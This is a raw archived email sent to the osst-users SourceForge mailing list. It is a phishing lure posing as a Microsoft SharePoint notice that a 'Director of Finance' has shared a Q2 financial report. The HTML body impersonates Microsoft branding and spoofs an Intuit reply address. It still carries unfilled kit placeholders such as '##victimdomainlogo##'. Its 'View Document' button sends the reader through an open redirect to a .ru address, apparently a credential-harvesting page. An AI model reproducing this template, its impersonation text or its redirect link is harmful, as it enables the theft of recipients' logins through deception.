Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 15001B13DD5
	for <lists+osst-users@lfdr.de>; Mon, 28 Jul 2025 17:03:46 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=XVXgYetYiCZbeszuF9/0k5ugCL28v51YLMk8dEPipF0=; b=FfU0v7Y4kBXCaIjpDrJq5JXwEw
	VV23kNbkt4Pr3K7Qamf067N6R+YKca/dcqdxSowdk2vb4/KRBjlpUeDsW5MZtjRje9iN9ImE1gmGi
	cXLR7OtcqDg4Juuq75NieWFF1+82tiYeSlu2PF6/u5mcSj5kpDHS3QElaefruh1xNDaY=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1ugPOC-0006V6-1r
	for lists+osst-users@lfdr.de;
	Mon, 28 Jul 2025 15:03:44 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <quickbooks@notification.intuit.com>)
 id 1ugPOA-0006Uz-Tx for osst-users@lists.sourceforge.net;
 Mon, 28 Jul 2025 15:03:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ZMBcfgAA5PG7lInbpDKMJrsAfhy50honcm4vrWxiMUY=; b=Qrpfq+aupdys/QdEi5jI2preg3
 ENYpUkHK9MxQC2IsvjIuuA2gD5F1IMjWDED5DaV+CR3hPq2JICUN+5eGMjgkMjkAv2Bq3juCWslGM
 D0u6VUEuQW2Soz9kYpeEihMVNhnu4zOGyssul1ttyDj/unxpVGMTSMhs6vzX3CL1J47c=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=ZMBcfgAA5PG7lInbpDKMJrsAfhy50honcm4vrWxiMUY=; b=W
 TK6oLFChKU1r4MIXhdXaMmrmogYwCAL3o7KcW23dPamRjXGLdw7gluyKDF56XTtqVpc6ajwUXw6pp
 tedlQP5EjW64vSXRsoGuPJ05n8BU4VqLq/bHHMPC3cP8gtq19mEph57teiShuvEhV2s4vSDJpekRY
 jf7/dXV85soq7rnk=;
Received: from [198.37.105.153] (helo=j3n4c9blr2.iconmarketingguy.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1ugPOA-0000jc-9c for osst-users@lists.sourceforge.net;
 Mon, 28 Jul 2025 15:03:42 +0000
To: osst-users@lists.sourceforge.net
Date: 28 Jul 2025 17:03:31 +0200
Message-ID: <20250728170331.416500656BBD9634@notification.intuit.com>
MIME-Version: 1.0
X-Spam-Score: 2.3 (++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Email OR ##victimdomainlogo## New Document Shared via
 SharePoint
 Content analysis details:   (2.3 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_HK_SPAMMY_FILENAME   No description available.
 0.9 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
X-Headers-End: 1ugPOA-0000jc-9c
Subject: [Osst-users] =?utf-8?q?Document_Shared_by_Director_of_Finance_?=
 =?utf-8?q?=E2=80=93_Access_via_SharePoint_osst-users=40lists=2Esourceforg?=
 =?utf-8?q?e=2Enet?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: Director of Finance via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: Director of Finance <quickbooks@notification.intuit.com>
Content-Type: multipart/mixed; boundary="===============0220401895253959992=="
Errors-To: osst-users-bounces@lists.sourceforge.net


--===============0220401895253959992==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_502DBBE7.D3CD68FE"


------=_NextPart_000_0012_502DBBE7.D3CD68FE
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta charset=3D"UTF-8">
  <title>Email</title>
</head>
<body style=3D"margin: 0px; padding: 0px; font-family: Arial, sans-serif; b=
ackground-color: rgb(244, 244, 244);">
  <table width=3D"100%" bgcolor=3D"#f4f4f4" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
    <tbody><tr>
      <td align=3D"center">
        <table width=3D"600" style=3D"padding: 20px; border-radius: 6px;" b=
gcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
          <!-- Header -->
          <tbody><tr>
            <td align=3D"center" style=3D"padding-bottom: 10px; border-bott=
om-color: rgb(16, 124, 16); border-bottom-width: 3px; border-bottom-style: =
solid;">
              <img style=3D"vertical-align: middle;" alt=3D"SharePoint Logo=
" src=3D"https://img.icons8.com/?size=3D100&amp;id=3D117558&amp;format=3Dpn=
g&amp;color=3D000000">
              <span style=3D"color: rgb(102, 102, 102); font-size: 14px; ma=
rgin-left: 10px; vertical-align: middle;">OR &nbsp; ##victimdomainlogo##</s=
pan>
            </td>
          </tr>

          <!-- Title -->
          <tr>
            <td align=3D"center" style=3D"padding-top: 20px;">
              <h2 style=3D"margin: 0px; color: rgb(51, 51, 51); font-size: =
20px;">New Document Shared via SharePoint</h2>
              <p style=3D"margin: 5px 0px 20px; color: rgb(51, 51, 51); fon=
t-size: 14px;">You&#8217;ve received a document for your review</p>
            </td>
          </tr>

          <!-- Message -->
          <tr>
            <td style=3D"color: rgb(51, 51, 51); line-height: 1.6; font-siz=
e: 14px;">
              <p>Dear <strong>colosMaster</strong>,</p>
              <p>A new document has been shared with you via SharePoint. Yo=
u can access and review the file using the secure link or QR code below.</p=
>
            </td>
          </tr>

          <!-- Info Table -->
          <tr>
            <td>
              <table width=3D"100%" style=3D"color: rgb(51, 51, 51); font-s=
ize: 14px; margin-top: 15px; border-collapse: collapse;" border=3D"0" cells=
pacing=3D"0" cellpadding=3D"6">
                <tbody><tr style=3D"border-bottom-color: rgb(204, 204, 204)=
; border-bottom-width: 1px; border-bottom-style: solid;">
                  <td width=3D"30%" style=3D"font-weight: bold;">File Name:=
</td>
                  <td>Financial_Report_Q2.xlsx</td>
                </tr>
                <tr style=3D"border-bottom-color: rgb(204, 204, 204); borde=
r-bottom-width: 1px; border-bottom-style: solid;">
                  <td style=3D"font-weight: bold;">Shared By:</td>
                  <td>Director of Finance - Accounting Dept</td>
                </tr>
                <tr style=3D"border-bottom-color: rgb(204, 204, 204); borde=
r-bottom-width: 1px; border-bottom-style: solid;">
                  <td style=3D"font-weight: bold;">Date Shared:</td>
                  <td>##date2##</td>
                </tr>
                <tr style=3D"border-bottom-color: rgb(204, 204, 204); borde=
r-bottom-width: 1px; border-bottom-style: solid;">
                  <td style=3D"font-weight: bold;">Access:</td>
                  <td>View &amp; Download</td>
                </tr>
              </tbody></table>
            </td>
          </tr>

          <!-- Button -->
          <tr>
            <td align=3D"center" style=3D"padding: 20px 0px;">
              <a style=3D"padding: 12px 25px; border-radius: 4px; color: rg=
b(255, 255, 255); font-size: 14px; font-weight: bold; text-decoration: none=
; display: inline-block; background-color: rgb(16, 124, 16);" href=3D"http:=
//www.newage.ne.jp/search/rank.cgi?id=3D186&amp;mode=3Dlink&amp;url=3Dhttps=
://tiumkc.ngovji.ru/WmMzm@cLOVtr5766/">View Document</a>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style=3D"padding: 20px; text-align: left; color: rgb(204, 2=
04, 204); font-size: 11px; background-color: rgb(26, 26, 26);">
              <table style=3D"margin-bottom: 10px;" border=3D"0" cellspacin=
g=3D"0" cellpadding=3D"0">
                <tbody><tr>
                  <td style=3D"padding-right: 6px;">
                    <img style=3D"vertical-align: middle;" alt=3D"Microsoft=
 Logo" src=3D"cid:microsoft.png">
                  </td>
                  <td style=3D"color: rgb(204, 204, 204); font-size: 12px; =
font-weight: bold; vertical-align: middle;">Microsoft</td>
                </tr>
              </tbody></table>
              <p style=3D"margin: 6px 0px;">&copy; 2025 Microsoft SharePoin=
t. All rights reserved.</p>
              <p style=3D"margin: 6px 0px;">This message from Microsoft is =
an important part of a program, service, or product that you or your compan=
y purchased or participates in.</p>
              <p style=3D"margin: 6px 0px;">Microsoft respects your privacy=
=2E Please read our Privacy Statement. This is a mandatory service communic=
ation.</p>
              <p style=3D"margin: 6px 0px;">To set your contact preferences=
 for other communications, visit the Promotional Communications Manager.</p=
>
              <p style=3D"margin: 6px 0px;">Microsoft Corporation, One Micr=
osoft Way, Redmond, WA 98052</p>
            </td>
          </tr>

        </tbody></table>
      </td>
    </tr>
  </tbody></table>


</body></html>
------=_NextPart_000_0012_502DBBE7.D3CD68FE
Content-Type: image/png; name="microsoft.png"
Content-Transfer-Encoding: base64
Content-ID: <microsoft.png>
Content-Disposition: inline; filename="microsoft.png"

iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwY
AAAAYElEQVR4nGNgGDTgf7jSf0ysGOq9LjDUZ33Af3Q8akAANgMUQzFwtIqMx9pAGZAh6BjD
AOYVn0PRMcParzL/93PK/D/AFoqOMQ1Y+eU/Bl7xGaLhIPt/dDxqADumAQMGABBpTxOhwpdf
AAAAAElFTkSuQmCC

------=_NextPart_000_0012_502DBBE7.D3CD68FE--


--===============0220401895253959992==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0220401895253959992==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0220401895253959992==--

